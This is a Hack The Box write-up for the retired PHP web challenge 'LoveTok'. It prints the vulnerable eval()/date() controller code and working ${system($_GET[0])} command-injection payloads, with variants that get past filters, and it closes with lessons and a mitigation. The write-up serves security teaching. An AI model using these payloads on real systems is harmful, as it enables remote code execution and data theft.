---
challenge: LoveTok
type: Web
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [web, php, code-injection, eval]
---

# LoveTok — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Solved challenge; no real flags.

## TL;DR

The controller takes `format` from `GET` and concatenates it inside an `eval` calling `date()`. `addslashes` escapes quotes and backslashes but **not** PHP's `${...}` interpolation: `${system($_GET[0])}` runs a command and reads the flag.

## Brief

```text
/?format=r
```

Returns the date in `r` format. The source ships with the challenge: `controllers/TimeController.php` and `models/TimeModel.php`.

## Recon

```bash
curl -s 'http://<IP>:<PORT>/'
curl -s 'http://<IP>:<PORT>/?format=Y-m-d'
```

Changing `format` changes the output: the input reaches the date function.

## The flaw

```php
public function getTime() {
    eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');
    return isset($time) ? $time : 'Something went terribly wrong';
}
```

`format` goes through `addslashes()` (escapes `'`, `"`, `\` and NUL). The payload needs **no quotes**: PHP interpolates `${expression}` inside double-quoted strings and evaluates it, so the quote closing `date("` is supplied as `${...}`.

## Exploitation

```text
/?format=${system($_GET[0])}&0=ls
```

`system()` prints the output itself; `date()`'s value no longer matters. The flag is not in the current directory:

```text
/?format=${system($_GET[0])}&0=cat+../flag*
```

```text
HTB{<flag>}
```

Alternatives when spaces or quotes are filtered:

```text
${system(base64_decode($_GET[0]))}      # with the command base64-encoded
${include($_GET[0])}                    # to read a PHP/text file
```

## Evidence

- Trimmed output; no flags.
- Real values live in `private/`.

## Lessons

- **`addslashes` is not a defence**: `$`, `{` and `}` still pass.
- **`${}` in double-quoted strings** is evaluated interpolation, not concatenation.
- **The quote is unnecessary**: closing the string with `${` dodges the filter and keeps the code valid.
- **`../`**: the flag is served one level above the `DocumentRoot`.

- `eval` with user input is RCE, even when the author thinks only a format is controlled.
- A parameter that "just" picks a date format deserves an allowlist, not a quote filter.
- Mitigation: `date()` with allowed formats (`Y-m-d H:i:s`) and no `eval`.
